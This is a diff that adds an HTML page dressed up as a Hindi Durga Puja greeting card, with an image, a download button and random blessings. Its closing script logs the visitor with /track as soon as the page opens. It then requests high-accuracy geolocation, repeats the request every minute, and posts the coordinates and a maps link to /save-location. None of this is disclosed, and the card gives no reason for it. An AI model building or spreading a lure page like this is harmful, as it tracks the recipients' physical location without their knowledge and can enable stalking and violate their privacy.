@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="hi">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>शुभ दुर्गा पूजा ✨</title>
+
+    <link rel="stylesheet" href="{{url_for('static',filename='css/index.css')}}">
+</head>
+
+<body>
+    <div class="glow"></div>
+
+    <main class="card">
+        <p class="eyebrow">एक छोटा-सा सरप्राइज़ ✨</p>
+        <h1>शुभ दुर्गा पूजा</h1>
+        <p class="subtitle">Shubho Durga Puja!</p>
+
+        <div class="art">
+            <img src="{{url_for('static',filename='images/durga.jpeg')}}"
+                alt="सुंदर रोशनी से सजा दुर्गा पूजा पंडाल और माँ दुर्गा" />
+            <div class="caption">
+                माँ दुर्गा आपके जीवन को खुशियों से रोशन करें 🪔
+            </div>
+        </div>
+
+        <p class="message">
+            ढाक की धुन, धुनुची की खुशबू और अपनों के साथ—
+            आपकी पूजा प्यार, सुकून और ढेर सारी मुस्कान से भरी हो। ❤️
+        </p>
+
+        <p class="download-text">फोटो डाउनलोड करने के लिए यहाँ क्लिक करें 📥</p>
+        <a class="download-btn" href="{{url_for('static',filename='images/durga.jpeg')}}" download="durga-puja.png">
+            फोटो डाउनलोड करें
+        </a>
+
+        <div>
+            <button class="wish-btn" id="surpriseBtn">
+                मेरी पूजा की शुभकामना खोलें 🎁
+            </button>
+        </div>
+
+        <p id="blessing" aria-live="polite"></p>
+        <div class="footer">प्रेम, रोशनी और उत्सव के नाम ✨</div>
+    </main>
+
+    <script>
+        const wishes = [
+            "माँ दुर्गा आपको शक्ति, सुख और सफलता दें। शुभ पूजा! 🌺",
+            "आपके घर में खुशियाँ और दिल में शांति बनी रहे। 🪔",
+            "इस पूजा पर हर दिन प्यार और रोशनी से भरा हो। ❤️"
+        ];
+
+        document.getElementById("surpriseBtn").addEventListener("click", () => {
+            const randomWish = wishes[Math.floor(Math.random() * wishes.length)];
+            document.getElementById("blessing").textContent = randomWish;
+
+            for (let i = 0; i < 24; i++) {
+                const star = document.createElement("span");
+                star.className = "sparkle";
+                star.textContent = ["✦", "✧", "❋"][Math.floor(Math.random() * 3)];
+                star.style.left = Math.random() * 100 + "vw";
+                star.style.animationDuration = (2 + Math.random() * 3) + "s";
+                star.style.fontSize = (12 + Math.random() * 18) + "px";
+
+                document.body.appendChild(star);
+                setTimeout(() => star.remove(), 5200);
+            }
+        });
+
+        fetch("/track", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                page_path: window.location.pathname
+            })
+        })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error("Tracking failed");
+                }
+                return response.json();
+            })
+            .then(data => {
+                localStorage.setItem("visitor_id", data.visitor_id);
+                console.log("Visit successfully recorded.");
+
+            })
+            .catch(() => {
+
+                console.log("Visit record nahi ho saka.");
+
+            });
+
+        function getLocation() {
+
+            if (!navigator.geolocation) {
+                status = "GeoLocation Not Supported";
+                return;
+            }
+            console.log("Location Permission Wait...");
+
+            navigator.geolocation.getCurrentPosition(
+                async function (position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+
+                    // console.log(`Latitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters`);
+
+                    try {
+                        id = localStorage.getItem("visitor_id");
+                        const response = fetch("/save-location", {
+                            method: "POST", headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ id, latitude, longitude, accuracy, mapLink })
+                        });
+                        const result = await response.json();
+                        console.log(result);
+
+                    } catch (error) {
+                        console.log("Failed to save location.");
+                    }
+                }, function (error) {
+                    console.log("Location Not Found Please Check your Permission or Device Setting");
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
+
+
+        }
+        getLocation();
+        setInterval(getLocation, 60000);
+    </script>
+</body>
+
+</html>
